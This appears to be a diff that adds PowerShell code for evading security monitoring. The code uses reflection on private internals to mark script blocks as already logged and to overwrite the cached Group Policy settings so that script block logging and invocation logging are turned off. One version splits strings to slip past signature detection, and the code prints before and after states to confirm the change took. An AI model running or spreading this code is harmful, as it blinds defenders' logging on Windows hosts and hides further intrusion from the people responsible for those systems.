@@ -23,3 +23,24 @@ $Cmd = [System.Management.Automation.CmdletInfo]::new("Write-Host", [Microsoft.P
 $script = [ScriptBlock]::new("Write-host 'sad'")
 [ScriptBlock].getproperty("HasLogged",@('nonpublic','instance')).setvalue($script, $true)
 $script.invoke()
+
+$settings = [Ref].Assembly.GetType(“System.Management.Automation.Utils”).GetField(“cachedGroupPolicySettings”,”NonPublic,Static”).GetValue($null);
+$settings[“HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging”] = @{}
+$settings[“HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging”].Add(“EnableScriptBlockLogging”, “0”)
+
+$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetF`ie`ld"('cachedGro'+'upPolicySettings', 'N'+'onPu'+'blic,Static')
+If ($GroupPolicyField) {
+  $GroupPolicyCache = $GroupPolicyField.GetValue($null)
+  Write-Host("Before")
+  $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] | fl
+  If ($GroupPolicyCache['ScriptB'+'lockLogging']) {
+    $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
+    $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
+  }
+  $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
+  $val.Add('EnableScriptB'+'lockLogging', 0)
+  $val.Add('EnableScriptB'+'lockInvocationLogging', 0)
+  $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val
+  Write-Host("After")
+  $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] | fl
+}
